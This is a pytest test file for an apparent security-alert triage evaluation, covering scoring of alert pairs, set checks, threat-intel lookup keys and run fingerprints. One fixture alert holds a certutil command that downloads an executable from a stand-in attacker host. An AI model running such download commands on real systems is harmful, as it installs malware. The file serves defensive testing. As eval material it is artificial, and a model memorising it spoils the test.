"""Tools eval set (docs/tools-eval-plan.md): pair scorer, set checks, separate fingerprint."""

from __future__ import annotations

import json

import pytest

from evals import run as ev
from evals import tools_set
from evals.eval_row import EvalRow
from evals.scorers import tools_scores
from sentinel.schemas import Alert

BAD_IP, CLEAN_IP = "45.137.22.10", "13.107.4.50"


def _alert(alert_id: str, dst_ip: str | None = None, cmd: str = "svchost.exe") -> Alert:
    event = {
        "event_id": "e-1",
        "timestamp": "2026-01-01T00:00:00Z",
        "source": "windows_sysmon",
        "host": "WS1",
        "process": {"image": "svchost.exe", "command_line": cmd},
        "raw": {},
        "untrusted_fields": [],
    }
    if dst_ip:
        event["network"] = {"dst_ip": dst_ip, "dst_port": 443}
    return Alert.model_validate(
        {"alert_id": alert_id, "detection_name": "t", "severity": "medium", "events": [event]}
    )


def _row(alert_id: str, label: str, verdict: str) -> EvalRow:
    return EvalRow(
        config="rag-tools",
        alert_id=alert_id,
        label=label,
        label_techniques=[],
        verdict=verdict,
        latency_s=1.0,
    )


LABELS = [
    {"alert_id": "A01-bad", "label": "true_positive", "technique_ids": [], "pair": "A01"},
    {"alert_id": "A01-clean", "label": "benign_noisy", "technique_ids": [], "pair": "A01"},
    {"alert_id": "A02-bad", "label": "true_positive", "technique_ids": [], "pair": "A02"},
    {"alert_id": "A02-clean", "label": "benign_noisy", "technique_ids": [], "pair": "A02"},
]
ALERTS = {
    "A01-bad": _alert("A01-bad", BAD_IP),
    "A01-clean": _alert("A01-clean", CLEAN_IP),
    "A02-bad": _alert("A02-bad", BAD_IP),
    "A02-clean": _alert("A02-clean", CLEAN_IP),
}


def test_pair_counts_only_when_both_verdicts_right():
    rows = [
        _row("A01-bad", "true_positive", "true_positive"),
        _row("A01-clean", "benign_noisy", "benign_noisy"),
        _row("A02-bad", "true_positive", "true_positive"),
        _row("A02-clean", "benign_noisy", "true_positive"),  # same verdict twice: no pair
    ]
    looked = {"lookups": [{"name": "threatfox_ioc_lookup", "args": {"ioc": "x"}}]}
    details = {"A01-bad": looked, "A01-clean": looked, "A02-clean": looked | {"rejected": [{}]}}
    t = tools_scores(rows, details, LABELS, ALERTS)
    assert t["pairs"] == 2 and t["pairs_right"] == ["A01"] and t["pair_accuracy"] == 0.5
    assert t["alerts_with_target"] == 4 and t["lookup_recall"] == 0.75
    assert t["clean_true_positive_after_lookup"] == ["A02-clean"]
    assert t["refused_calls"] == 1


def test_half_pair_is_not_scored():
    rows = [_row("A01-bad", "true_positive", "true_positive")]
    t = tools_scores(rows, {}, LABELS, ALERTS)
    assert t["pairs"] == 0 and t["pair_accuracy"] is None


def test_problems_flags_no_target_and_bad_pairs():
    alerts = ALERTS | {"A02-clean": _alert("A02-clean", "10.0.0.5")}  # private IP: no target
    labels = LABELS[:3] + [LABELS[3] | {"label": "true_positive"}]
    issues = tools_set.problems(labels, alerts)
    assert any("A02-clean: no lookup target" in i for i in issues)
    assert any("pair A02" in i and "one TP + one benign" in i for i in issues)
    assert tools_set.problems(LABELS, ALERTS) == []


def test_cache_keys_include_url_host_and_cve():
    a = _alert("u", cmd="certutil -urlcache -f http://evil-host.net/a.exe CVE-2021-40444")
    keys = tools_set.cache_keys(a)
    assert ("nvd_cve_lookup", "CVE-2021-40444") in keys
    assert {k for t, k in keys if t == "threatfox_ioc_lookup"} >= {"evil-host.net"}
    assert len([k for t, k in keys if t == "threatfox_ioc_lookup"]) == 2  # url + its host


def test_load_tools_set_reads_files(tmp_path):
    cands = tmp_path / "candidates.json"
    cands.write_text(json.dumps([{"alert": ALERTS["A01-bad"].model_dump(mode="json")}]))
    labels = tmp_path / "labels.jsonl"
    labels.write_text(json.dumps(LABELS[0]) + "\n")
    got_labels, got_alerts = tools_set.load_tools_set(cands, labels)
    assert [x["alert_id"] for x in got_labels] == ["A01-bad"] and "A01-bad" in got_alerts
    labels.write_text(json.dumps(LABELS[1]) + "\n")
    with pytest.raises(SystemExit):
        tools_set.load_tools_set(cands, labels)


def test_tools_set_has_its_own_fingerprint(monkeypatch, tmp_path):
    golden = ev.fingerprint("rag", ev.CONFIGS["rag"])
    assert "set" not in golden  # stored dev rows stay valid
    cands = tmp_path / "candidates.json"
    cands.write_text("[]")
    monkeypatch.setattr(ev, "ALERT_FILES", [cands])
    monkeypatch.setattr(ev, "TOOLS_SET", True)
    tools = ev.fingerprint("rag", ev.CONFIGS["rag"])
    assert tools["set"] == "tools" and tools["alerts_sha"] != golden["alerts_sha"]


def test_set_tools_refuses_split():
    with pytest.raises(SystemExit):
        ev.main(["--set", "tools", "--split", "dev", "--score-only"])


def test_run_creates_nested_results_dir(monkeypatch, tmp_path):
    """--run X --set tools writes to results/X/tools/: both levels must be created."""
    monkeypatch.setattr(ev, "RESULTS", tmp_path / "tools-v1" / "tools")
    monkeypatch.setattr(ev, "PAUSE_S", 0)
    monkeypatch.setattr(ev, "run_alert", lambda alert, **kw: (_ for _ in ()).throw(TypeError))
    assert ev.run_config("rag", [], {}, trace=False, fresh=False)
    assert (tmp_path / "tools-v1" / "tools" / "rag.rows.jsonl").exists()
